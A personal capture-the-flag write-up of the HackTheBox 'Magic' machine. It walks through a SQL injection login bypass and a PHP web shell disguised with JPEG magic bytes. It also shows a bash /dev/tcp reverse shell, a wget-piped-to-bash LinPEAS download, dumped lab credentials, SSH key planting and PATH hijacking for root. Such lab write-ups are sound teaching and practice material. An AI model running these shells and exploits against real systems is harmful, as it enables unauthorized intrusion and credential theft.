2021
### NMAP

```
sudo nmap -sC -sV -oA nmap-magic 
10.10.10.185
```

![[HackTheBox/Linux/attachments/Pasted image 20250509204904.png]]
- 22, 80
### Enumerating web page 
![[HackTheBox/Linux/attachments/Pasted image 20250509191721.png]]
- peep login on bottom left

Going to cyberchef to reverse the hex on the images (hint that something may be hex encoded later on)

![[HackTheBox/Linux/attachments/Pasted image 20250509204555.png]]
![[HackTheBox/Linux/attachments/Pasted image 20250509204623.png]]

#### View Source Code
There's a /images directory 
![[HackTheBox/Linux/attachments/Pasted image 20250509204817.png]]
Not much else

#### Check if this is php server 
In browser navigate to /index.html -> 404
![[HackTheBox/Linux/attachments/Pasted image 20250509205147.png]]

Navigate to /index.php -> 200
![[HackTheBox/Linux/attachments/Pasted image 20250509205234.png]]
### Gobuster

```
gobuster dir -u http://10.10.10.185 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o gobuster.root
```

![[HackTheBox/Linux/attachments/Pasted image 20250509205511.png]]

```
gobuster dir -u http://10.10.10.185/images/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster.images
```

![[HackTheBox/Linux/attachments/Pasted image 20250509212705.png]]

Checking out /upload.php and it brings us to /login.php

![[HackTheBox/Linux/attachments/Pasted image 20250509205604.png]]
- try to login with `admin:admin` -> ⛔

### Attempt SQLi against the login

Remove the masked password field in dev tools > delete password string from type="password"
![[HackTheBox/Linux/attachments/Pasted image 20250509205842.png]]
After
![[HackTheBox/Linux/attachments/Pasted image 20250509205920.png]]

Password isn't masked 
![[HackTheBox/Linux/attachments/Pasted image 20250509205936.png]]

SQLi attempt + send it through Burp
![[HackTheBox/Linux/attachments/Pasted image 20250509210011.png]]

Burp intercepts request 
![[HackTheBox/Linux/attachments/Pasted image 20250509210100.png]]
- Type CTRL+SHIFT+U to remove URL encoding

Then modify request to add spaces and then re-url encode 

![[HackTheBox/Linux/attachments/Pasted image 20250509210235.png]]

This logs us in lol

![[HackTheBox/Linux/attachments/Pasted image 20250509210310.png]]
- we can upload an image 
------------------------------------------ 
#### Keep recon going in the background

Save the POST request for the login to a file called login.

Modify request for SQLmap 

![[HackTheBox/Linux/attachments/Pasted image 20250509210517.png]]

Run #sqlmap 

```
sqlmap -r reqs/login --batch --tamper=space2comment
```

-------------------------------

Back to the upload image form 

Create quick php shell to upload

```
<?php system($_REQUESTS['PleaseSubscribe']); ?>
```

Upload it and send through Burp

Response - only JPG, JPEG and PNG allowed
![[HackTheBox/Linux/attachments/Pasted image 20250509211148.png]]

Try changing the MIME TYPE 
```
image/jpg
image/jpeg
```

In Burp Request, change content-type to image/jpg

![[HackTheBox/Linux/attachments/Pasted image 20250509211346.png]]

Still same error 
![[HackTheBox/Linux/attachments/Pasted image 20250509211401.png]]

Change the file extension to .php.jpg
![[HackTheBox/Linux/attachments/Pasted image 20250509211441.png]]

Different error message
![[HackTheBox/Linux/attachments/Pasted image 20250509211457.png]]

Hypothesize that it is using the ✨magic✨ bytes of the file to determine the file type

Grabbing the magic bytes of a random jpg on local box with 
```
head <name of file>.jpg | xxd
```

See the magic bytes 

![[HackTheBox/Linux/attachments/Pasted image 20250509211912.png]]

Grab the first 20 bytes of the jpg 
```
head -c 20 <name of file>.jpg | xxd
```

![[HackTheBox/Linux/attachments/Pasted image 20250509212049.png]]

Save these 20 bytes to a file 
```
head -c 20 <name of file>.jpg > jpeg-magicbytes
```

Cat this magic bytes file with the shell.php file 

```
cat jpeg-magicbytes shell.php > magical-shell.php
```

Upload this magical-shell.php through a Burp Request

Add a .jpeg file extension within the Burp request 

![[HackTheBox/Linux/attachments/Pasted image 20250509212511.png]]

The shell was uploaded!!
![[HackTheBox/Linux/attachments/Pasted image 20250509212538.png]]

Now we have to figure out where the file uploaded to. 

Review gobuster output for the /images url and we have an /uploads directory 

Navigate to this directory 
![[HackTheBox/Linux/attachments/Pasted image 20250509212910.png]]
- we get code execution!!

-------------------------------
## BONUS FUZZING
### Fuzzing /index.php

```
wfuzz -u 'http://10.10.10.185/index.php?FUZZ=index' -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt
```

Then add --hl 59 to hide length 

![[HackTheBox/Linux/attachments/Pasted image 20250509213547.png]]
- nothing

Trying the common.txt wordlist as well. 

-------------------------

There was a typo in the php shell 
```
<?php system($_REQUEST['PleaseSubscribe']);  ?>
```

Modify Burp request and resend the shell to the server :)

Got code execution 
![[HackTheBox/Linux/attachments/Pasted image 20250509214225.png]]

Need to uncheck the File Extension in Intercept Client Requests to be able to intercept "images"

![[HackTheBox/Linux/attachments/Pasted image 20250509214348.png]]

Change the request type to a POST because there are less bad characters
![[HackTheBox/Linux/attachments/Pasted image 20250509214436.png]]

Whoami Request 
![[HackTheBox/Linux/attachments/Pasted image 20250509214540.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250509214559.png]]

### Send Reverse Shell 

Create reverse shell request within Burp 

```
bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'
```

![[HackTheBox/Linux/attachments/Pasted image 20250509214756.png]]

Highlight and select CTRL + U to url encode :)
 ![[HackTheBox/Linux/attachments/Pasted image 20250509214843.png]]

💡Log terminal output 💡- This will save whatever subsequent terminal commands and output to a log file

```
script web-shell.log
```

![[HackTheBox/Linux/attachments/Pasted image 20250509215129.png]]

Set up nc listener 
```
nc -lvnp 9001
```

Send the reverse shell request in Burp an catch the reverse shell

![[HackTheBox/Linux/attachments/Pasted image 20250509215232.png]]

Get an interactive shell 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Hit CTRL + Z

```
stty raw -echo
```

```
export TERM=xterm
```

![[HackTheBox/Linux/attachments/Pasted image 20250509215618.png]]

### Enumeration for Priv Esc from www-data 

Checking out the image files in the home directory in the web browser..?

![[HackTheBox/Linux/attachments/Pasted image 20250509215938.png]]

Find a database file with creds
![[HackTheBox/Linux/attachments/Pasted image 20250509220033.png]]
`sql:theseus:iamkingtheseus`

#### Running LinPEAS

```
wget -O - 10.10.14.2:8080/linpeas.sh | bash
```
![[HackTheBox/Linux/attachments/Pasted image 20250509220324.png]]

Reviewing some of the output 
![[HackTheBox/Linux/attachments/Pasted image 20250509220525.png]]
- whoopsie? -> standard linux thing 

Nothing very interesting..

Rechecking the SETUID files for this year

```
find / -perm -4000 -ls 2>/dev/null | grep -v 201
```

![[HackTheBox/Linux/attachments/Pasted image 20250509221155.png]]

💡in case tty gets weird and line wrappy 💡
```
stty columns 136 rows 32
```
![[HackTheBox/Linux/attachments/Pasted image 20250509221056.png]]

Notice there's an old version of sudo 

```
find / -perm -4000 -ls 2>/dev/null | grep -v 2018
```

![[HackTheBox/Linux/attachments/Pasted image 20250509221342.png]]

Check sudo version 
```
sudo --version
```

![[HackTheBox/Linux/attachments/Pasted image 20250509221413.png]]

Check md5sum of sudo SUID binary path

![[HackTheBox/Linux/attachments/Pasted image 20250509221452.png]]

Search for this md5 hash in VirusTotal to figure out when it was first seen
![[HackTheBox/Linux/attachments/Pasted image 20250509221606.png]]

![[HackTheBox/Linux/attachments/Pasted image 20250509221631.png]]
- 2017 - so this is an old binary

### Dumping MySQL database

Using mysqldump 

```
mysqldump -u theseus -p Magic
```

![[HackTheBox/Linux/attachments/Pasted image 20250510001852.png]]

Database dump
![[HackTheBox/Linux/attachments/Pasted image 20250510002001.png]]
`admin:Th3s3usW4sK1ng`

We have the user theseus in `/etc/passwd`

### Switch to Theseus User

```
su - theseus
```

Creating an ssh key so that we can ssh in as theseus 

```
ssh-keygen -f theseus
```

```
cat theseus.pub
```

![[HackTheBox/Linux/attachments/Pasted image 20250510002434.png]]

Copy this ssh public key and paste it in authorized_keys file in theseus's .ssh directory

```
echo ssh-rsa AAAB3NzaC1kdshfklhdfhdh > authorized_keys
```

![[HackTheBox/Linux/attachments/Pasted image 20250510002641.png]]

On Kali box 
```
chmod 600 theseus
```

Now ssh in as theseus

```
ssh -i theseus theseus@10.10.10.185
```
#### Enumerating for priv esc to root

`sudo -l` gets an error
![[HackTheBox/Linux/attachments/Pasted image 20250510002906.png]]

Run linPEAS again, but don't find anything 

#### Find files that this user owns
```
find / -user theseus -ls 2>/dev/null
```

#### Find files that the users group owns
```
find / -group users -ls 2>/dev/null
```
![[HackTheBox/Linux/attachments/Pasted image 20250510003343.png]]
- `/bin/sysinfo`

#### Strace on Sysinfo
To figure out what sysinfo does 

```
strace sysinfo
```

![[HackTheBox/Linux/attachments/Pasted image 20250510003806.png]]

Follow forks using -f with strace and see exec() calls

```
strace -f sysinfo
```

We see in this execve function that this sysinfo binary is not using absolute paths

![[HackTheBox/Linux/attachments/Pasted image 20250510004234.png]]

Search for execve within the strace 

#### Trying to abuse execv functions with relative paths 

Starting with `free` and naming this reverse shell free
![[HackTheBox/Linux/attachments/Pasted image 20250510004610.png]]

Set up nc listener 
```
nc -lvnp 9001
```

Run this export to change the path to current working directory (the same directory our free exploit file is located)
![[HackTheBox/Linux/attachments/Pasted image 20250510004922.png]]

So then when we execute sysinfo, we get a reverse shell as root (we hijacked the path for free from the sysinfo config)

![[HackTheBox/Linux/attachments/Pasted image 20250510005308.png]]
![[HackTheBox/Linux/attachments/Pasted image 20250510005351.png]]

⭐got root⭐



